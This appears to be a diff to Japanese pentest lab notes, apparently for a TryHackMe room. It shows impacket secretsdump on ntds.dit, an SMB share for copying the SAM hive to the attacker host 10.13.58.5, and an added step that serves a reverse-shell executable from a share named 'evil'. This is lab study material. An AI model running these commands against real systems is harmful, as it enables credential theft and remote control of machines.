@@ -59,6 +59,11 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
 ```  
+以下をKaliで行うと、ターゲットWindows上で//<kali_IP>/evil/hoge.exeとしてreverseshellを実行できる。
+```
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support evil $PWD
+```
+
 Kali側でサーバとして待ち受けてからWindwos側で以下みたいなコマンドをやるとファイルをコピーして送信できる。
 ```
 copy C:\Users\THMBackup\sam.hive \\10.13.58.5\public\ \\10.13.58.5\public\ 
